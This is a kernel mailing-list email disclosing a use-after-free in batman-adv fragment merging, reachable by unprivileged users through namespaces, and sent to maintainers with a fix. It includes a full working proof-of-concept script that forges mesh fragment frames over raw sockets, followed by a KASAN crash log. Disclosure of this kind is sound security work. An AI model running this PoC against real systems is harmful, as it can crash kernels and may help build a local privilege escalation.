Return-Path: <b.a.t.m.a.n-bounces+batman=archiver.kernel.org@lists.open-mesh.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from diktynna.open-mesh.org (diktynna.open-mesh.org [136.243.236.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 061C7C55167
	for <batman@archiver.kernel.org>; Fri, 31 Jul 2026 04:50:46 +0000 (UTC)
Received: from diktynna.open-mesh.org (localhost [IPv6:::1])
	by diktynna.open-mesh.org (Postfix) with ESMTP id 62DE980485
	for <batman@archiver.kernel.org>; Fri, 31 Jul 2026 06:50:45 +0200 (CEST)
ARC-Seal: i=2; cv=pass; a=rsa-sha256; d=open-mesh.org; s=20121;
 t=1785473445;
 b=myT2HQNhWrO5I+WcOXr+KtfE9OvE8q0CVmjlfI6wn3R9iwcKUkEDo2ZDTOQfopstMYKii
 cDl00wchxNM7+flC4AG3Jusn4y1OtYjciXrnkscphTnZYndhIddleGlwOUiv2iyTJomjQNS
 yOceTrIvznXlWXYgTO6x2kFawzVZpME=
ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed;
 d=open-mesh.org; s=20121; t=1785473445; h=from : sender : reply-to :
 subject : date : message-id : to : cc : mime-version : content-type :
 content-transfer-encoding : content-id : content-description :
 resent-date : resent-from : resent-sender : resent-to : resent-cc :
 resent-message-id : in-reply-to : references : list-id : list-help :
 list-unsubscribe : list-subscribe : list-post : list-owner :
 list-archive; bh=JS323rSauL+4t2EUsfMH9yVlclc3T7PTM3nTZCW5QAA=;
 b=wskqn8fIKPjhIqH8Ls2vjYh+NgQ6AK0qF7tjkF6FreN7uMf76Au+ID6+uirT/vmh/sjPg
 YxGYOxpJZTUDPXtsHzkTSu1avp0nnqwVnXDUUIUgyPa64eoq/JHI/vEXkNtV8gjbsbF1nPk
 PTpZvX0r8sB8t93zqbDR/7rNkE8BYCQ=
ARC-Authentication-Results: i=2; open-mesh.org;
 dkim=pass header.d=nebusec.ai;
 arc=pass;
 dmarc=pass header.from=nebusec.ai policy.dmarc=quarantine
Authentication-Results: open-mesh.org; dkim=pass header.d=nebusec.ai;
 arc=pass;
 dmarc=pass (Used From Domain Record) header.from=nebusec.ai policy.dmarc=quarantine
Received: from mail-pf1-x42c.google.com (mail-pf1-x42c.google.com
 [IPv6:2607:f8b0:4864:20::42c])
	by diktynna.open-mesh.org (Postfix) with ESMTPS id B35C8807B0
	for <b.a.t.m.a.n@lists.open-mesh.org>; Fri, 31 Jul 2026 05:19:12 +0200 (CEST)
ARC-Seal: i=1; a=rsa-sha256; d=open-mesh.org; s=20121; cv=none; t=1785467963;
	b=WPx1Lgu1xsjobkmA4/psrPSwQyC4CiQnt5XtkI4bTu5N7ufjyu7EEvmJEF/YsxzmwuWIs+
	APmpL/c12lAI17DkflQd0/AnJCBbWYNpiIt17e5cEYb4cHn5Z/4S+lm9Z3GPeK4VimMR5x
	wQEjt7LEFUnnAE61b22IOpQW5BOCnV4=
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=open-mesh.org;
	s=20121; t=1785467963;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding:dkim-signature;
	bh=JS323rSauL+4t2EUsfMH9yVlclc3T7PTM3nTZCW5QAA=;
	b=pcjL/zUu8gWt+wMtT57wU0SUshxkIOu2bbXKre57QfR6MA7FQQl5UnFXIGXk5yNc7Jb942
	HUdjoXdl8CMPC125AOHCdkwLro6U9C6RayapwvEE//Ap5ttDke3AafCjbcBfE7Zd18NZvC
	k28Vuu90CDMwA9CYSCQxJO4OnvxQBVU=
ARC-Authentication-Results: i=1;
	diktynna.open-mesh.org;
	dkim=pass header.d=nebusec.ai header.s=google header.b=oHxemEc+;
	spf=pass (diktynna.open-mesh.org: domain of zhilinz@nebusec.ai designates
 2607:f8b0:4864:20::42c as permitted sender) smtp.mailfrom=zhilinz@nebusec.ai;
	dmarc=pass (policy=quarantine) header.from=nebusec.ai
Received: by mail-pf1-x42c.google.com with SMTP id
 d2e1a72fcca58-84830c774a0so595176b3a.1
        for <b.a.t.m.a.n@lists.open-mesh.org>;
 Thu, 30 Jul 2026 20:19:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785467950; x=1786072750;
 darn=lists.open-mesh.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=JS323rSauL+4t2EUsfMH9yVlclc3T7PTM3nTZCW5QAA=;
        b=oHxemEc+ua1wqZVREUWBWdV+VPoCLLcGsKvjKRfYDAJXrQllh8uhfBbqaDYAwMqAVA
         ZPWyu3YSv1lpkhrbfzMx7A9EyD8YKejS3LN2vx8TmHA8r1346tg1m7693ExFoIyTdjr1
         K6dgUqtAXgEQOmdm1+Pq9ZJl2hZlYdy9DPVEdPtc0zgkPgqbx5YgY+lsqJtT52OpjAQF
         +TxUzAitcttjVJvJKZia6DZ97SOwSXryH2TZ/PITGtoOw2g9+jPbVvxGnmgRlqwQJMZb
         wkY4XFov/XTpR2/m5eMn/L39lrs41L7kadw1FnfOT+va3rUHDAZYA0Ci57+yMtVtzn0R
         B+Gg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785467950; x=1786072750;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=JS323rSauL+4t2EUsfMH9yVlclc3T7PTM3nTZCW5QAA=;
        b=m4AL6UWRNA0mU8HbGBc9VyVHPVqOaT3lr5QStRj0GCS9PrlYKd84C891Z5thrrye7m
         PLAJTnbvl6ynwdO902cxMYbmjJ/ovO3aSY2M6u0KLPxQOoFD+hZ+lM0x5oUzASxpfJZG
         /Kw5kRpe9cDObpMa37RbsPohnfjsujLpUp2qqN8gHlP3D8VN+g55os//ophZgSZMQSV6
         sNZTU+lqPuk12gjZEIE9Dx6ai9zP9I80tmQnjeEkk3TELl9C0t8217EYY0lGaWYWJX0J
         Mt2y7lkGrfR9j0oEjHG2morKuOvtjr4kEm+EraKg2Gh7DxurYnv3AvCz7vzr/SFewqut
         1e7g==
X-Gm-Message-State: AOJu0YxCrlnyR6mZdwn95cKoVIFHAU8f3VXqeHSVHdgqnwIpcqib1D0A
	nmv/+sNKfS/eIxZEAvE3ZqyUaALCT/8S+BkGmJmz04jOyYDI0oqucKl6dv0ZGsgyWnM/Nx6gJpc
	SsVxmS7qZ9rs=
X-Gm-Gg: AR+sD11hSnfyJ7TFlO3ZoUdGLS4PdDIPIWODH8t38WTapnq9sEY/QbBUtbvAAnzLDmh
	uznmJX++UNm2nstAWjj64+eStcd3CdhYSu1+yc7UU5uwCSJiUhFWdkkFAEJERdwRI++YrxRS+SL
	qyoT5DKWsz4r0aXKUCYgj3JJ7ug9g/7bZu8MIjV0dkymmjQiVCRrXZzt/CDlK6wc94Xe6scHku2
	WMh7ikccM2iijWPWgFlV3d4vlckOKf6PBdgBcD10Ab+8sigtc0AuaR2/RON0CGmEG/1pwmv2qDT
	SeOtRFbRaikIMSetUAzcahmR4RY80UWuoxCtGHk2XobSMLhGM2eVyPU8Y0ScjTUobNfIKc+27PE
	rQeG/ZUa81U/9Hj4fVg7EV00WlLJ/QkCGE75yHi2xAvJQB3QOkeo9izxYj0QygkGvY/++Ld66M4
	6Pf0e2zVI92CJVumzoEs8Ek2UvCOqbIzGlkdnqHH50xrfiVm/JOuzkW07XXc8PdD52bH/fUXpim
	4qH
X-Received: by 2002:a05:6a00:a203:b0:84a:2ec8:fca6 with SMTP id
 d2e1a72fcca58-84ed6f1dc08mr261591b3a.52.1785467949985;
        Thu, 30 Jul 2026 20:19:09 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.58])
        by smtp.gmail.com with ESMTPSA id
 d2e1a72fcca58-84ed57d2197sm142557b3a.18.2026.07.30.20.19.06
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 20:19:08 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: b.a.t.m.a.n@lists.open-mesh.org
Cc: marek.lindner@mailbox.org,
	sw@simonwunderlich.de,
	antonio@mandelbit.com,
	sven@narfation.org,
	martin@hundeboll.net,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH v2 0/1] batman-adv: fix stale receive device on merged
 fragments
Date: Fri, 31 Jul 2026 11:18:48 +0800
Message-ID: <cover.1785467374.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-MailFrom: zhilinz@nebusec.ai
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; loop;
 banned-address; header-match-b.a.t.m.a.n.lists.open-mesh.org-0;
 header-match-b.a.t.m.a.n.lists.open-mesh.org-1;
 header-match-b.a.t.m.a.n.lists.open-mesh.org-2;
 header-match-b.a.t.m.a.n.lists.open-mesh.org-3; emergency; member-moderation
Message-ID-Hash: AYGL2DETOQYADPJZEIH6NS3JHLIG7XYM
X-Message-ID-Hash: AYGL2DETOQYADPJZEIH6NS3JHLIG7XYM
X-Mailman-Approved-At: Fri, 31 Jul 2026 06:49:47 +0200
X-Mailman-Version: 3.3.10
Precedence: list
List-Id: The list for a Better Approach To Mobile Ad-hoc Networking
 <b.a.t.m.a.n.lists.open-mesh.org>
Archived-At: 
 <https://lists.open-mesh.org/mailman3/hyperkitty/list/b.a.t.m.a.n@lists.open-mesh.org/message/AYGL2DETOQYADPJZEIH6NS3JHLIG7XYM/>
List-Archive: 
 <https://lists.open-mesh.org/mailman3/hyperkitty/list/b.a.t.m.a.n@lists.open-mesh.org/>
List-Help: <mailto:b.a.t.m.a.n-request@lists.open-mesh.org?subject=help>
List-Owner: <mailto:b.a.t.m.a.n-owner@lists.open-mesh.org>
List-Post: <mailto:b.a.t.m.a.n@lists.open-mesh.org>
List-Subscribe: <mailto:b.a.t.m.a.n-join@lists.open-mesh.org>
List-Unsubscribe: <mailto:b.a.t.m.a.n-leave@lists.open-mesh.org>

Hi Linux kernel maintainers,

We found and validated an issue in net/batman-adv/fragmentation.c. The bug is
reachable by a non-root user via user and net namespace.

We've tested the fix, and it should not affect normal functionality.

We will provide detailed information about the bug in this email, along with a
PoC to trigger it.

---- details below ----

Bug details:

batadv_frag_insert_packet() buffers fragment skbs and later reuses the
highest-numbered buffered skb as the merged packet. If that skb arrived on hard
interface A and A is deleted before the remaining fragments arrive on
interface B, the merged skb re-enters batadv_batman_skb_recv() with the stale
skb->dev and skb_iif from A.

DAT and bridge loop avoidance derive ARP parsing state from skb->dev, so the
reconstructed packet can reach batadv_arp_get_type() and dereference the freed
net_device before it is delivered to the local mesh interface.

Reproducer:

    chmod +x ./poc.sh
    unshare -Urn env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

: "${WAIT_AFTER_SETUP:=1.5}"
: "${WAIT_AFTER_OGM:=0.5}"
: "${WAIT_AFTER_HIGH:=0.5}"
: "${WAIT_AFTER_DELETE:=6.0}"
: "${WAIT_AFTER_MID:=6.0}"
: "${WAIT_AFTER_LOW:=1.0}"
: "${PHY_DEST_MODE:=tb}"
: "${DELETE_IFACE:=ta}"
: "${SEQNO:=0x1234}"

export WAIT_AFTER_SETUP
export WAIT_AFTER_OGM
export WAIT_AFTER_HIGH
export WAIT_AFTER_DELETE
export WAIT_AFTER_MID
export WAIT_AFTER_LOW
export PHY_DEST_MODE
export DELETE_IFACE
export SEQNO

python3 - "$@" <<'PY'
import os
import re
import socket
import struct
import subprocess
import time

BATADV_IV_OGM = 0x00
BATADV_UNICAST = 0x40
BATADV_UNICAST_FRAG = 0x41
BATADV_COMPAT_VERSION = 15
ETH_P_BATMAN = 0x4305
ETH_P_ARP = 0x0806
ARPOP_REQUEST = 1


def env_float(name: str) -> float:
    return float(os.environ[name])


def env_int(name: str) -> int:
    return int(os.environ[name], 0)


WAIT_AFTER_SETUP = env_float("WAIT_AFTER_SETUP")
WAIT_AFTER_OGM = env_float("WAIT_AFTER_OGM")
WAIT_AFTER_HIGH = env_float("WAIT_AFTER_HIGH")
WAIT_AFTER_DELETE = env_float("WAIT_AFTER_DELETE")
WAIT_AFTER_MID = env_float("WAIT_AFTER_MID")
WAIT_AFTER_LOW = env_float("WAIT_AFTER_LOW")
PHY_DEST_MODE = os.environ["PHY_DEST_MODE"]
DELETE_IFACE = os.environ["DELETE_IFACE"]
SEQNO = env_int("SEQNO")


def run(cmd: str) -> None:
    subprocess.run(cmd, shell=True, check=True)


def output(cmd: str) -> str:
    return subprocess.check_output(cmd, shell=True, text=True).strip()


def mac_bytes(text: str) -> bytes:
    return bytes(int(part, 16) for part in text.split(":"))


def ip_bytes(text: str) -> bytes:
    return socket.inet_aton(text)


def iface_mac(name: str) -> bytes:
    text = output(f"ip -o link show dev {name}")
    match = re.search(r"link/ether ([0-9a-f:]{17})", text)
    if not match:
        raise SystemExit(f"failed to parse MAC for {name}: {text}")
    return mac_bytes(match.group(1))


def send_frame(iface: str, dst: bytes, src: bytes, payload: bytes) -> None:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    try:
        sock.bind((iface, 0))
        frame = dst + src + struct.pack("!H", ETH_P_BATMAN) + payload
        sock.send(frame)
    finally:
        sock.close()


def ogm_packet(orig: bytes, seqno: int = 1) -> bytes:
    return struct.pack(
        "!BBBBI6s6sBBH",
        BATADV_IV_OGM,
        BATADV_COMPAT_VERSION,
        50,
        0,
        seqno,
        orig,
        orig,
        0,
        0xFF,
        0,
    )


def frag_packet(no: int, dest: bytes, orig: bytes, seqno: int,
                total_size: int, payload: bytes) -> bytes:
    flags = (no & 0xF) << 4
    return struct.pack(
        "!BBBB6s6sHH",
        BATADV_UNICAST_FRAG,
        BATADV_COMPAT_VERSION,
        50,
        flags,
        dest,
        orig,
        seqno,
        total_size,
    ) + payload


def merged_unicast_arp(dest_mac: bytes) -> bytes:
    inner_src = mac_bytes("02:11:22:33:44:55")
    inner_eth = b"\xff" * 6 + inner_src + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1,
        0x0800,
        6,
        4,
        ARPOP_REQUEST,
        inner_src,
        ip_bytes("192.0.2.1"),
        b"\x00" * 6,
        ip_bytes("192.0.2.2"),
    )
    uni = struct.pack(
        "!BBBB6s",
        BATADV_UNICAST,
        BATADV_COMPAT_VERSION,
        50,
        0,
        dest_mac,
    )
    return uni + inner_eth + arp


def cleanup() -> None:
    for dev in ("bat0", "ta", "tb"):
        run(f"ip link del {dev} 2>/dev/null || true")


cleanup()
run("ip link add ta type veth peer name aa")
run("ip link add tb type veth peer name bb")
run("ip link add bat0 type batadv")
run("ip link set ta master bat0")
run("ip link set tb master bat0")
for dev in ("bat0", "ta", "tb", "aa", "bb"):
    run(f"ip link set {dev} up")

time.sleep(WAIT_AFTER_SETUP)

mac_ta = iface_mac("ta")
mac_tb = iface_mac("tb")
fake_orig = mac_bytes("02:aa:bb:cc:dd:01")

if PHY_DEST_MODE == "ta":
    phy_dest = mac_ta
elif PHY_DEST_MODE == "tb":
    phy_dest = mac_tb
else:
    raise SystemExit(f"unsupported PHY_DEST_MODE={PHY_DEST_MODE}")

send_frame("aa", b"\xff" * 6, fake_orig, ogm_packet(fake_orig))
time.sleep(WAIT_AFTER_OGM)

merged = merged_unicast_arp(mac_tb)
parts = (merged[:20], merged[20:36], merged[36:])

send_frame("aa", phy_dest, fake_orig,
           frag_packet(2, mac_tb, fake_orig, SEQNO, len(merged), parts[0]))
time.sleep(WAIT_AFTER_HIGH)

run(f"ip link del {DELETE_IFACE}")
time.sleep(WAIT_AFTER_DELETE)

send_frame("bb", mac_tb, fake_orig,
           frag_packet(1, mac_tb, fake_orig, SEQNO, len(merged), parts[1]))
time.sleep(WAIT_AFTER_MID)

send_frame("bb", mac_tb, fake_orig,
           frag_packet(0, mac_tb, fake_orig, SEQNO, len(merged), parts[2]))
time.sleep(WAIT_AFTER_LOW)
PY

------END poc.sh--------

----BEGIN crash log----

[  234.446245] [      C0] BUG: KASAN: slab-use-after-free in batadv_arp_get_type.isra.0 (build/../net/batman-adv/distributed-arp-table.c:261 build/../net/batman-adv/distributed-arp-table.c:1043)
[  234.446350] [      C0] Read of size 2 at addr ffff88807cd19230 by task python3/10420

[  234.446408] [      C0] CPU: 0 UID: 0 PID: 10420 Comm: python3 Not tainted 6.12.95 #2
[  234.446431] [      C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  234.446441] [      C0] Call Trace:
[  234.446455] [      C0]  <IRQ>
[  234.446469] [      C0]  dump_stack_lvl (build/../lib/dump_stack.c:118 (discriminator 2))
[  234.446517] [      C0]  print_report (build/../include/linux/mm.h:1903 build/../mm/kasan/report.c:289 build/../mm/kasan/report.c:376 build/../mm/kasan/report.c:482)
[  234.446574] [      C0]  ? batadv_arp_get_type.isra.0 (build/../net/batman-adv/distributed-arp-table.c:261 build/../net/batman-adv/distributed-arp-table.c:1043)
[  234.446583] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.446608] [      C0]  ? __virt_addr_valid (build/../include/linux/instrumented.h:82 build/../include/asm-generic/bitops/instrumented-non-atomic.h:141 build/../include/linux/mmzone.h:2214 build/../include/linux/mmzone.h:2290 build/../arch/x86/mm/physaddr.c:54)
[  234.446649] [      C0]  ? batadv_arp_get_type.isra.0 (build/../net/batman-adv/distributed-arp-table.c:261 build/../net/batman-adv/distributed-arp-table.c:1043)
[  234.446658] [      C0]  kasan_report (build/../mm/kasan/report.c:593)
[  234.446673] [      C0]  ? batadv_arp_get_type.isra.0 (build/../net/batman-adv/distributed-arp-table.c:261 build/../net/batman-adv/distributed-arp-table.c:1043)
[  234.446694] [      C0]  batadv_arp_get_type.isra.0 (build/../net/batman-adv/distributed-arp-table.c:261 build/../net/batman-adv/distributed-arp-table.c:1043)
[  234.446704] [      C0]  ? __pfx_batadv_orig_hash_find (build/../net/batman-adv/originator.c:537 (discriminator 2))
[  234.446729] [      C0]  batadv_dat_snoop_incoming_arp_request (build/../net/batman-adv/distributed-arp-table.c:1074 build/../net/batman-adv/distributed-arp-table.c:1236)
[  234.446737] [      C0]  ? batadv_bla_is_backbone_gw (build/../net/batman-adv/bridge_loop_avoidance.c:1787)
[  234.446752] [      C0]  batadv_recv_unicast_packet (build/../include/linux/skbuff.h:2996 build/../include/linux/skbuff.h:3149 build/../include/linux/if_ether.h:27 build/../net/batman-adv/routing.c:971)
[  234.446771] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.446786] [      C0]  batadv_batman_skb_recv (build/../arch/x86/include/asm/atomic.h:23 build/../include/linux/atomic/atomic-arch-fallback.h:457 build/../include/linux/atomic/atomic-instrumented.h:33 build/../net/batman-adv/main.c:443)
[  234.446798] [      C0]  ? __pfx_batadv_batman_skb_recv (build/../include/linux/skbuff.h:2533)
[  234.446812] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.446818] [      C0]  ? batadv_is_my_mac (build/../include/linux/etherdevice.h:357 build/../include/linux/etherdevice.h:409 build/../net/batman-adv/main.h:263 build/../net/batman-adv/main.c:301)
[  234.446835] [      C0]  batadv_recv_frag_packet (build/../net/batman-adv/routing.c:1098)
[  234.446848] [      C0]  ? __pfx_batadv_recv_frag_packet (build/../include/linux/skbuff.h:1724)
[  234.446886] [      C0]  ? __pfx_mark_lock (build/../kernel/locking/lockdep.c:4021)
[  234.446922] [      C0]  ? __pfx___lock_acquire (build/../kernel/locking/lockdep.c:4397 (discriminator 11))
[  234.446937] [      C0]  batadv_batman_skb_recv (build/../arch/x86/include/asm/atomic.h:23 build/../include/linux/atomic/atomic-arch-fallback.h:457 build/../include/linux/atomic/atomic-instrumented.h:33 build/../net/batman-adv/main.c:443)
[  234.446949] [      C0]  ? __pfx_batadv_batman_skb_recv (build/../include/linux/skbuff.h:2533)
[  234.446960] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.446967] [      C0]  ? lock_acquire.part.0+0x119/0x370
[  234.446978] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.446989] [      C0]  ? __pfx_batadv_batman_skb_recv (build/../include/linux/skbuff.h:2533)
[  234.446998] [      C0]  ? process_backlog (build/../include/linux/rcupdate.h:839 (discriminator 1) build/../net/core/dev.c:6665 (discriminator 1))
[  234.447045] [      C0]  __netif_receive_skb_one_core (build/../net/core/dev.c:6205)
[  234.447056] [      C0]  ? __pfx___netif_receive_skb_one_core (build/../net/core/dev.c:6244)
[  234.447070] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447077] [      C0]  ? lock_acquire (build/../kernel/locking/lockdep.c:5828)
[  234.447084] [      C0]  ? process_backlog (build/../include/linux/rcupdate.h:839 (discriminator 1) build/../net/core/dev.c:6665 (discriminator 1))
[  234.447100] [      C0]  process_backlog (build/../include/linux/rcupdate.h:871 build/../net/core/dev.c:6667)
[  234.447122] [      C0]  __napi_poll.constprop.0 (build/../net/core/dev.c:7730)
[  234.447137] [      C0]  net_rx_action (build/../net/core/dev.c:6621 build/../net/core/dev.c:7974)
[  234.447162] [      C0]  ? __pfx_net_rx_action (build/../net/core/dev.c:13182 (discriminator 2))
[  234.447258] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447268] [      C0]  ? clockevents_program_event (build/../kernel/time/clockevents.c:353 (discriminator 2))
[  234.447294] [      C0]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
[  234.447347] [      C0]  handle_softirqs (build/../include/linux/kernel_stat.h:62 (discriminator 1) build/../kernel/softirq.c:619 (discriminator 1))
[  234.447386] [      C0]  ? __pfx_handle_softirqs (build/../kernel/softirq.c:405)
[  234.447398] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447405] [      C0]  ? irqtime_account_irq (build/../kernel/sched/cputime.c:59 (discriminator 2))
[  234.447432] [      C0]  ? __dev_queue_xmit (build/../include/linux/filter.h:796 build/../net/core/dev.c:4534 build/../net/core/dev.c:4807)
[  234.447444] [      C0]  do_softirq (build/../kernel/softirq.c:523 (discriminator 20) build/../kernel/softirq.c:510 (discriminator 20))
[  234.447454] [      C0]  </IRQ>
[  234.447458] [      C0]  <TASK>
[  234.447463] [      C0]  __local_bh_enable_ip (build/../kernel/softirq.c:457 (discriminator 1))
[  234.447473] [      C0]  ? __dev_queue_xmit (build/../include/linux/filter.h:796 build/../net/core/dev.c:4534 build/../net/core/dev.c:4807)
[  234.447481] [      C0]  __dev_queue_xmit (build/../include/linux/filter.h:796 build/../net/core/dev.c:4534 build/../net/core/dev.c:4807)
[  234.447495] [      C0]  ? __might_fault (build/../mm/memory.c:7324 (discriminator 1))
[  234.447523] [      C0]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
[  234.447542] [      C0]  ? __pfx___dev_queue_xmit (build/../include/linux/netdevice.h:4010 (discriminator 1))
[  234.447556] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447563] [      C0]  ? _copy_from_iter (build/../include/linux/iov_iter.h:27 build/../include/linux/iov_iter.h:302 build/../include/linux/iov_iter.h:330 build/../lib/iov_iter.c:261 build/../lib/iov_iter.c:272)
[  234.447611] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447629] [      C0]  ? packet_parse_headers (build/../include/linux/skbuff.h:2533 build/../include/linux/skbuff.h:2866 build/../include/linux/skbuff.h:2881 build/../include/linux/if_vlan.h:672 build/../net/packet/af_packet.c:1936)
[  234.447663] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447669] [      C0]  ? packet_parse_headers (build/../include/linux/skbuff.h:2533 build/../include/linux/skbuff.h:2866 build/../include/linux/skbuff.h:2881 build/../include/linux/if_vlan.h:672 build/../net/packet/af_packet.c:1936)
[  234.447684] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447691] [      C0]  ? __check_object_size (build/../include/linux/mm.h:2973 build/../mm/usercopy.c:200 build/../mm/usercopy.c:258 build/../mm/usercopy.c:223)
[  234.447714] [      C0]  ? __pfx_sock_alloc_send_pskb (build/../net/core/sock.c:2830 (discriminator 2))
[  234.447750] [      C0]  ? __pfx_packet_parse_headers (build/../include/net/dst.h:285)
[  234.447761] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447769] [      C0]  ? skb_copy_datagram_from_iter (build/../net/core/datagram.c:561)
[  234.447791] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447808] [      C0]  packet_sendmsg (build/../net/packet/af_packet.c:3045 (discriminator 1) build/../net/packet/af_packet.c:3114 (discriminator 1))
[  234.447834] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447843] [      C0]  ? ref_tracker_alloc (build/../include/linux/list.h:161 build/../include/linux/list.h:177 build/../lib/ref_tracker.c:280)
[  234.447881] [      C0]  ? __pfx___might_resched (build/../kernel/sched/core.c:5888 (discriminator 7))
[  234.447901] [      C0]  ? __pfx___lock_acquire (build/../kernel/locking/lockdep.c:4397 (discriminator 11))
[  234.447916] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447923] [      C0]  ? aa_sk_perm+0x1d8/0x8d0
[  234.447964] [      C0]  ? __pfx_packet_sendmsg (build/../arch/x86/include/asm/atomic.h:23)
[  234.447987] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.447994] [      C0]  ? apparmor_socket_sendmsg+0x2e/0x200
[  234.448021] [      C0]  __sys_sendto (build/../net/socket.c:787 (discriminator 2) build/../net/socket.c:802 (discriminator 2) build/../net/socket.c:2265 (discriminator 2))
[  234.448038] [      C0]  ? __pfx___sys_sendto (build/../net/socket.c:2219)
[  234.448045] [      C0]  ? __local_bh_enable_ip (build/../kernel/softirq.c:457 (discriminator 1))
[  234.448054] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.448060] [      C0]  ? lockdep_hardirqs_on (build/../kernel/locking/lockdep.c:4472)
[  234.448102] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.448108] [      C0]  ? __sys_bind (build/../net/socket.c:1933 (discriminator 2) build/../net/socket.c:1925 (discriminator 2) build/../net/socket.c:1964 (discriminator 2))
[  234.448150] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.448167] [      C0]  __x64_sys_sendto (build/../net/socket.c:2272 build/../net/socket.c:2268 build/../net/socket.c:2268)
[  234.448177] [      C0]  ? do_syscall_64 (build/../include/linux/entry-common.h:144 (discriminator 1) build/../include/linux/entry-common.h:178 (discriminator 1) build/../arch/x86/entry/syscall_64.c:89 (discriminator 1))
[  234.448192] [      C0]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.448199] [      C0]  ? lockdep_hardirqs_on (build/../kernel/locking/lockdep.c:4472)
[  234.448209] [      C0]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.448225] [      C0]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  234.448241] [      C0] RIP: 0033:0x7ff350f43687
[  234.448267] [      C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
